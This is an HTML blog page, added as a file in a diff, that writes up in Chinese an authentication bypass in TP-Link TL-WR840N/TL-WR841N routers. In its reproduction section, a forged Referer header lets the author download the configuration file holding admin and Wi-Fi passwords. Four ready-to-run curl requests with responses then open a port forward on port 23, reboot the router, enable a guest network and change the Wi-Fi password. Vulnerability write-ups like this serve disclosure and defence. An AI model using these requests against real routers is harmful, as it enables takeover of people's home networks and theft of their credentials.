@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="zh">
+
+<head>
+            <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="">
+        <meta name="author" content="">
+
+        <title>JenI's Blog</title>
+
+        <link rel="icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+        <link rel="shortcut icon" href="https://blog.jenisec.org/theme/images/favicon.ico" type="image/x-icon">  
+
+
+        <link href="https://blog.jenisec.org/theme/css/iconfont.css" rel="stylesheet">
+
+        <!-- Bootstrap Core CSS -->
+        <link href="https://blog.jenisec.org/theme/css/bootstrap.min.css" rel="stylesheet">
+
+        <!-- Custom CSS -->
+        <link href="https://blog.jenisec.org/theme/css/clean-blog.min.css" rel="stylesheet">
+
+        <!-- Code highlight color scheme -->
+            <link href="https://blog.jenisec.org/theme/css/code_blocks/monokai.css" rel="stylesheet">
+
+        <!-- Custom Fonts -->
+        <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+        <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+        <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
+
+        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+
+
+
+			<meta property="og:locale" content="zh">
+		<meta property="og:site_name" content="JenI's Blog">
+
+	<meta property="og:type" content="article">
+	<meta property="article:author" content="">
+	<meta property="og:url" content="https://blog.jenisec.org/security/tl-authentication-bypass.html">
+	<meta property="og:title" content="TP-Link TL-WR840N/TL-WR841N 路由器认证绕过漏洞">
+	<meta property="og:description" content="">
+	<meta property="og:image" content="https://blog.jenisec.org/../theme/images/posts/TP-Link/cover.png">
+	<meta property="article:published_time" content="2018-06-08 00:00:00+08:00">
+</head>
+
+<body style="background-color: #f8f8f8">
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+        <div class="container-fluid">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header page-scroll">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="https://blog.jenisec.org/">JenI's Blog</a>
+            </div>
+
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav navbar-right">
+                        <li><a href="https://blog.jenisec.org/category/ji-qi-xue-xi.html">机器学习</a></li>
+                        <li><a href="https://blog.jenisec.org/category/an-quan.html">安全</a></li>
+                        <li><a href="https://blog.jenisec.org/category/xi-tong.html">系统</a></li>
+                        <li><a href="https://blog.jenisec.org/category/ri-chang.html">日常</a></li>
+
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+    <!-- Page Header -->
+        <header class="intro-header" style="background-image: url('../theme/images/posts/TP-Link/cover.png')">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <div class="post-heading">
+                        <h1>TP-Link TL-WR840N/TL-WR841N 路由器认证绕过漏洞</h1>
+                        <span class="meta">Posted by
+                                <a href="https://blog.jenisec.org/author/jeni.html">JenI</a>
+                             on 2018-06-08 00:00:00+08:00
+                        </span>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1" style="background-color: #f8f8f8;position: relative;">
+    <!-- Post Content -->
+    <article style="background-color: #f8f8f8;position: relative;">
+        <p><strong><em>前言</em></strong></p>
+<p>普联技术有限公司（以下简称"TP-LINK"）是全球领先的网络通讯设备供应商。自1996年成立以来，TP-LINK始终致力于为大众提供最便利的本地局域网络互联和Internet接入手段 ，为大众在生活、工作、娱乐上日益增长的网络使用需求，提供高品质、高性能价格比的全面设备解决方案。TP-LINK产品涵盖以太网、无线局域网、宽带接入、电力线通信，在既有的传 输、交换、路由等主要核心领域外，正大力扩展移动互联网终端、智能家居、网络安全等领域。</p>
+<p>最近，TP-Link TL-WR840N 和 TL-WR841N 中被发现存在安全漏洞，该漏洞源于程序没有正确的处理会话。攻击者可利用该漏洞执行任意操作。以下产品和版本受到影响：TP-Link TL-WR840N v5 00000005 0.9.1 3.16 v0001.0 Build 170608 Rel.58696n 版本；TL-WR841N v13 00000013 0.9.1 4.16 v0001.0 Build 170622 Rel.64334n 版本。</p>
+<p><strong><em>漏洞分析</em></strong></p>
+<p>TL-WR840N 和 TL-WR841N 的 WEB 服务提供了 CGI，这允许用户通过 CGI 对路由器执行部分操作。正常情况下，用户在通过 CGI 操作路由器时，路由器会首先对用户的身份进行认证，如果不是合法用户，路由器会返回 403 页面。但是如果请求中包含了特定的 HTTP Referer，就可以绕过认证阶段，直接执行用户请求的操作。</p>
+<p>HTTP Referer 是请求头的一部分，当浏览器向 Web 服务器发送请求的时候，通常会带上 Referer，告诉服务器请求是通过哪个页面进行的，服务器可以藉此获得一些信息用于处理请求，比如说防止外链等。</p>
+<p>在对 TL-WR840N 和 TL-WR841N 的 CGI 进行请求时，请求头中加入 Referer: http://xx.xx.xx.xx/mainFrame.htm 即可绕过认证(xx.xx.xx.xx换成路由器IP)，直接进行路由器操作。</p>
+<p><strong><em>漏洞复现</em></strong></p>
+<p>路由器的 cgi/ 目录下存在 conf.bin 文件，该文件内保存了路由器的相关配置。首先尝试直接对该文件进行请求，状态码为 403：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/TP-Link/tl-authentication-bypass-1.png" alt="tl-authentication-bypass-1" /></div>
+
+<p>然后在请求头中加入 Referer 字段，再次请求 conf.bin 文件：</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/TP-Link/tl-authentication-bypass-2.png" alt="tl-authentication-bypass-2" /></div>
+
+<p>成功读取了该文件。接着将该文件下载下来，并使用相应的工具可以查看路由器的配置。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/TP-Link/tl-authentication-bypass-3.png" alt="tl-authentication-bypass-3" /></div>
+
+<p>比如管理员的密码(特定版本可见)，无线网的密码等信息。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/TP-Link/tl-authentication-bypass-4.png" alt="tl-authentication-bypass-4" /></div>
+
+<p>通过得到的信息可以尝试通过浏览器登录路由器。</p>
+<div align="center"><img class="img-responsive" src="http://og1ifa4lj.bkt.clouddn.com/TP-Link/tl-authentication-bypass-5.png" alt="tl-authentication-bypass-5" /></div>
+
+<p>如果无法从配置文件中获得管理员的相关信息，依旧可以通过 CGI 来操作路由器，例如在路由器上配置端口转发、重启路由器、开启访客网络、更改无线网密码等，示例如下：</p>
+<p>配置端口转发(23端口)</p>
+<div class="highlight"><pre><span></span><span class="nt">curl</span> <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="nt">POST</span> <span class="nt">-H</span> <span class="s2">&quot;Host: xx.xx.xx.xx&quot;</span> <span class="nt">-H</span> <span class="s2">&quot;User-Agent:Mozilla/Agent22&quot;</span> <span class="nt">-H</span> <span class="s1">&#39;Accept: */*&#39;</span> <span class="nt">-H</span> <span class="s2">&quot;Referer:http://xx.xx.xx.xx/mainFrame.htm&quot;</span> <span class="nt">--data-binary</span> <span class="o">$</span><span class="s1">&#39;</span><span class="cp">[</span><span class="nx">IP_CONN_PORTTRIGGERING</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="vi">#1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="s1">0,5\x0d\x0atriggerPort=23\x0d\x0atriggerProtocol=TCP or UDP\x0d\x0aopenProtocol=TCP or UDP\x0d\x0aenable=1\x0d\x0aopenPort=23\x0d\x0a&#39;</span> <span class="nt">http</span><span class="o">://</span><span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">1</span><span class="o">/</span><span class="nt">cgi</span><span class="o">?</span><span class="nt">3</span>
+
+<span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span> <span class="nt">200</span> <span class="nt">OK</span>
+<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">plain</span><span class="o">;</span> <span class="nt">charset</span><span class="o">=</span><span class="nt">utf-8</span>
+<span class="nt">Transfer-Encoding</span><span class="o">:</span> <span class="nt">chunked</span>
+<span class="nt">Connection</span><span class="o">:</span> <span class="nt">keep-alive</span>
+
+<span class="cp">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="nt">0</span>
+<span class="nt">triggerPort</span><span class="o">=</span><span class="nt">23</span>
+<span class="nt">triggerProtocol</span><span class="o">=</span><span class="nt">TCP</span> <span class="nt">or</span> <span class="nt">UDP</span>
+<span class="nt">openProtocol</span><span class="o">=</span><span class="nt">TCP</span> <span class="nt">or</span> <span class="nt">UDP</span>
+<span class="nt">enable</span><span class="o">=</span><span class="nt">1</span>
+<span class="nt">openPort</span><span class="o">=</span><span class="nt">23</span>
+<span class="cp">[</span><span class="nx">error</span><span class="cp">]</span><span class="nt">0</span>
+</pre></div>
+
+
+<p>重启路由器([error]0说明命令执行成功)</p>
+<div class="highlight"><pre><span></span><span class="nt">curl</span> <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="nt">POST</span> <span class="nt">-H</span> <span class="s2">&quot;Host: xx.xx.xx.xx&quot;</span> <span class="nt">-H</span> <span class="s2">&quot;User-Agent:Mozilla/Agent22&quot;</span> <span class="nt">-H</span> <span class="s1">&#39;Accept: */*&#39;</span> <span class="nt">-H</span> <span class="s2">&quot;Referer:http://xx.xx.xx.xx/mainFrame.htm&quot;</span> <span class="nt">--data-binary</span> <span class="o">$</span><span class="s1">&#39;</span><span class="cp">[</span><span class="nx">ACT_REBOOT</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="s1">0,0\x0d\x0a&#39;</span> <span class="nt">http</span><span class="o">://</span><span class="nt">xx</span><span class="p">.</span><span class="nc">xx</span><span class="p">.</span><span class="nc">xx</span><span class="p">.</span><span class="nc">xx</span><span class="o">/</span><span class="nt">cgi</span><span class="o">?</span><span class="nt">7</span>
+
+<span class="nt">HTTP</span><span class="o">/</span><span class="nt">1</span><span class="p">.</span><span class="nc">1</span> <span class="nt">200</span> <span class="nt">OK</span>
+<span class="nt">Content-Type</span><span class="o">:</span> <span class="nt">text</span><span class="o">/</span><span class="nt">plain</span><span class="o">;</span> <span class="nt">charset</span><span class="o">=</span><span class="nt">utf-8</span>
+<span class="nt">Transfer-Encoding</span><span class="o">:</span> <span class="nt">chunked</span>
+<span class="nt">Connection</span><span class="o">:</span> <span class="nt">keep-alive</span>
+
+<span class="cp">[</span><span class="nx">error</span><span class="cp">]</span><span class="nt">0</span>
+</pre></div>
+
+
+<p>开启访客网络(SSID: Agent22, PreSharedKey: 9876543210)</p>
+<div class="highlight"><pre><span></span><span class="nt">curl</span> <span class="nt">-i</span> <span class="nt">-s</span> <span class="nt">-k</span> <span class="nt">-X</span> <span class="o">$</span><span class="s1">&#39;POST&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Host: xx.xx.xx.xx&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;User-Agent: Aent22&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Accept: */*&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Accept-Language: en-US,en;q=0.5&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Accept-Encoding: gzip, deflate&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Content-Type: text/plain&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Referer: http://xx.xx.xx.xx/mainFrame.htm&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Content-Length: 844&#39;</span> <span class="nt">-H</span> <span class="o">$</span><span class="s1">&#39;Connection: close&#39;</span> <span class="nt">--data-binary</span> <span class="o">$</span><span class="s1">&#39;</span><span class="cp">[</span><span class="nx">LAN_WLAN_MULTISSID</span><span class="vi">#1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="s1">0,1\x0d\x0amultiSSIDEnable=1\x0d\x0a</span><span class="cp">[</span><span class="nx">LAN_WLAN_MSSIDENTRY</span><span class="vi">#1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="s1">1,11\x0d\x0aIsolateClients=0\x0d\x0aEnable=1\x0d\x0aSSID=Agent22\x0d\x0aBeaconType=WPAand11i\x0d\x0aWPAAuthenticationMode=PSKAuthentication\x0d\x0aWPAEncryptionModes=TKIPandAESEncryption\x0d\x0aIEEE11iAuthenticationMode=PSKAuthentication\x0d\x0aIEEE11iEncryptionModes=TKIPandAESEncryption\x0d\x0aPreSharedKey=9876543210\x0d\x0aGroupKeyUpdateInterval=0\x0d\x0aMaxStaNum=32\x0d\x0a</span><span class="cp">[</span><span class="nx">LAN_WLAN_MSSIDENTRY</span><span class="vi">#1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="s1">2,1\x0d\x0aIsolateClients=0\x0d\x0a</span><span class="cp">[</span><span class="nx">LAN_WLAN_GUESTNET</span><span class="vi">#1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="s1">3,8\x0d\x0aLANAccessEnable=1\x0d\x0aUSBAccessEnable=0\x0d\x0aTCEnable=0\x0d\x0aTCMinUpBW=100\x0d\x0aTCMaxUpBW=200\x0d\x0aTCMinDownBW=100\x0d\x0aTCMaxDownBW=200\x0d\x0alastModified=1\x0d\x0a</span><span class="cp">[</span><span class="nx">LAN_WLAN_GUESTNET</span><span class="vi">#1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="vi">#0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="cp">]</span><span class="s1">4,8\x0d\x0aLANAccessEnable=1\x0d\x0aUSBAccessEnable=0\x0d\x0aTCEnable=0\x0d\x0aTCMinUpBW=100\x0d\x0aTCMaxUpBW=200\x0d\x0aTCMinDownBW=100\x0d\x0aTCMaxDownBW=200\x0d\x0alastModified=0\x0d\x0a&#39;</span> <span class="o">$</span><span class="s1">&#39;http://xx.xx.xx.xx/cgi?2&amp;2&amp;2&amp;2&amp;2&#39;</span>
+</pre></div>
+
+
+<p>更改无线网密码(IEEE11iAuthenticationMode: PSKAuthentication, IEEE11iEncryptionModes: AESEncryption, X_TP_PreSharedKey: 9876543210)</p>
+<div class="highlight"><pre><span></span>curl -i -s -k -X $&#39;POST&#39; -H $&#39;Host: XX.XX.XX.XX&#39; -H $&#39;User-Agent: Agent22&#39; -H $&#39;Accept-Encoding: gzip, deflate&#39; -H $&#39;Content-Type: text/plain&#39; -H $&#39;Referer: http://XX.XX.XX.XX/mainFrame.htm&#39; -H $&#39;Content-Length: 199&#39; -H $&#39;Connection: close&#39; --data-binary $&#39;[LAN_WLAN#1,1,0,0,0,0#0,0,0,0,0,0]0,5\x0d\x0aBeaconType=11i\x0d\x0aIEEE11iAuthenticationMode=PSKAuthentication\x0d\x0aIEEE11iEncryptionModes=AESEncryption\x0d\x0aX_TP_PreSharedKey=9876543210\x0d\x0aX_TP_GroupKeyUpdateInterval=0\x0d\x0a&#39; $&#39;http://XX.XX.XX.XX/cgi?2&#39;
+</pre></div>
+
+
+<p><strong><em>参考</em></strong></p>
+<blockquote>
+<p><a href="http://blog.securelayer7.net/time-to-disable-tp-link-home-wifi-router/">TP-Link-TL-WR840N-TL-WR841N-Authentication-Bypass</a></p>
+</blockquote>
+        <hr />
+        <p>作者:&#160; &#160;JenI&#160; &#160;转载请注明出处，谢谢</p>
+    </article>
+
+    <hr>
+
+        <div class="comments">
+            <h2>Comments !</h2>
+            <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'jenihk';
+                var disqus_identifier = 'security/tl-authentication-bypass.html';
+                var disqus_url = 'https://blog.jenisec.org/security/tl-authentication-bypass.html';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//jenihk.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+ <!--                   
+    <div id="disqus_thread"></div>
+    <script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = '//jenihk.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+-->
+            </div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    <ul class="list-inline text-center">
+                        <li>
+                            <a href="http://weibo.com/1992014191/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe657;</i>
+                                </span>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="http://github.com/jenihk">
+                                <span class="fa-stack fa-lg">
+                                    <i class="icon iconfont">&#xe618;</i>
+                                </span>
+                            </a>
+                        </li>
+                    </ul>
+                    <p class="copyright text-muted">Blog powered by <a href="http://getpelican.com">Pelican</a>,
+                which takes great advantage of <a href="http://python.org">Python</a>.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="https://blog.jenisec.org/theme/js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/bootstrap.min.js"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="https://blog.jenisec.org/theme/js/clean-blog.min.js"></script>
+    
+    <!-- CanvasParticles -->
+    <script src="https://blog.jenisec.org/theme/js/canvas-particle.js"></script>
+
+    
+
+    <script type="text/javascript">
+        CanvasParticle();
+    </script>
+
+    <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-85780345-1']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+    </script>
+<script type="text/javascript">
+    var disqus_shortname = 'jenihk';
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+</body>
+
+</html>
